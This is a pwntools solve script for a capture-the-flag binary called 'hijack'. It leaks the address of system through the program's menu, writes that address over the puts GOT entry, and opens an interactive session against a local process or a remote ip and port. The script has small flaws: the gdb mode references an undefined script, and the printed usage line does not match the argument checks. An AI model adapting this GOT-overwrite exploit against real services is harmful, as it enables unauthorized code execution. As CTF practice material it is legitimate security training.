#!/usr/bin/env python3
from pwn import *
import sys
exe = ELF("../handouts/hijack")
context.binary = exe
context.arch='amd64'
# context.log_level='debug'

def get_connection():
   
    if len(sys.argv) == 1 : r=process([exe.path]) 

    elif len(sys.argv) == 2 and sys.argv[1].lower() == 'gdb':
        return gdb.debug([exe.path],gdbscript=gs)
        
    elif len(sys.argv) == 4 and sys.argv[1].lower() == 'remote':
        try:
            ip = sys.argv[2]
            port = int(sys.argv[3])
            r = remote(ip, port)

        except ValueError:
            print("Error: Port must be a number")
            exit(1)
        except Exception :
            print("Error connecting to remote:")
            exit(1)
    else:
        print("Usage:")
        print("  Local:  python solve.py local")
        print("  Remote: python solve.py remote <ip> <port>")
        exit(1)
    return r

def main():
    r = get_connection()
    rop=ROP(context.binary) # rop.dump() , rop.raw() , rop.chain() , rop.func_name(param1,param2...) 
    

    sla = lambda x, y: r.sendlineafter(x, y)
    sa  = lambda x, y: r.sendafter(x, y)
    sl  = lambda x:    r.sendline(x)
    s   = lambda x:    r.send(x)
    rvu = lambda x:    r.recvuntil(x)
    rv  = lambda x:    r.recv(x)
    rvl = lambda:      r.recvline()
    li  = lambda x:    log.info(x)
    lc  = lambda x:    log.critical(x)
    rvlc= lambda x :   r.recvline_contains(x)
    sl(b'y')
    rvu(b'--o--o--(_)--o--o--')
   # r.recvall()
    sl(b'1')
    sl(b'system')
    
    # print(rvl())
    # print(rvl())
    rv(6)
    sys = int(rvl().strip().decode(),16)
    lc(hex(sys))

    puts = exe.got.puts
    lc(hex(puts))

    sl(b'2')

    sl(str(puts)+' '+str(sys))



    r.interactive()

if __name__ == "__main__":
    main()



